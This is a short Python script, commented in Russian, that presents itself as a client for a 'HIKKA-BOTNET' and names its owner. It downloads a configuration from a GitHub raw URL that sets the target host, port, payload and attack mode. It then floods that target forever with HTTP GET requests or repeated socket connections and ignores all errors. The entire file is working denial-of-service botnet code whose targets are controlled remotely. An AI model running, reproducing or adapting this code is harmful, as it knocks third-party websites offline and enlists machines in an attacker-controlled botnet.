#[+]==============[ INFO ]===========[+]#
"""данный код написан для системы
HIKKA-BOTNET, если вы участвуете в 
системе ботнет, напишите разработчику."""
# @hotdrify <-- OWNER
#[+]=================================[+]#
import json
import requests as r
import random
import socket

cfg = r.get("https://raw.githubusercontent.com/HotDrify/hikka.modules/main/assets/config.json")
config = json.loads(cfg.text)

ip = config["site"]
port = config["port"]
message = config["message"].encode()
type = config["type"]

if type == "GET":
    try:
        while True:
            r.get(f"{ip}:{port}")
    except:
        pass
elif type == "socket":
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        while True:
            ddos.connect((ip, port))
            ddos.send( message )
            ddos.close()
    except:
        pass